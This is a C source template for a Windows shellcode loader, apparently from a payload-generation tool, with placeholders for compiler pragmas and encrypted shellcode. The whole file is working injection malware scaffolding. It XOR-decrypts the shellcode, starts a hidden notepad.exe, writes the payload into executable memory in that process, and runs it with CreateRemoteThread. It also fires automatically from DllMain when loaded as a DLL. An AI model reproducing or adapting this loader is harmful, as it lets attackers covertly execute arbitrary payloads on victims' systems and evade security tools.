#include <windows.h>

#ifndef _DEBUG
#pragma comment(linker, "/ENTRY:entry")
#endif

{{ PRAGMAS }}
VOID decrypt_xor(BYTE* encrypted, SIZE_T encrypted_len, BYTE* key, SIZE_T key_len)
{
	for (SIZE_T i = 0; i < encrypted_len; i++)
	encrypted[i] ^= key[i % key_len];
	return;
}

VOID entry(void)
{

    HANDLE remote_thread_handle = INVALID_HANDLE_VALUE;
    PVOID base_address = INVALID_HANDLE_VALUE;

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};

    RtlZeroMemory(&si, sizeof(si));
    RtlZeroMemory(&pi, sizeof(pi));

    si.cb = sizeof(si);

	{{ SHELLCODE }}
	decrypt_xor(shellcode, sizeof(shellcode), key, sizeof(key));

    CreateProcessA(NULL, "C:\\Windows\\System32\\notepad.exe", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    base_address = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (base_address == INVALID_HANDLE_VALUE) return;

    if (!WriteProcessMemory(pi.hProcess, base_address, shellcode, sizeof(shellcode), NULL)) return;

    remote_thread_handle = CreateRemoteThread(pi.hProcess, 0, 0, (LPTHREAD_START_ROUTINE)base_address, NULL, 0, NULL);
    if (!remote_thread_handle) return;
	
	return;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
	{
		entry();
		break;
	}

	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
	{
		if (lpvReserved != nullptr)
		{
			break;
		}
		break;
	}
	}
	return TRUE;
}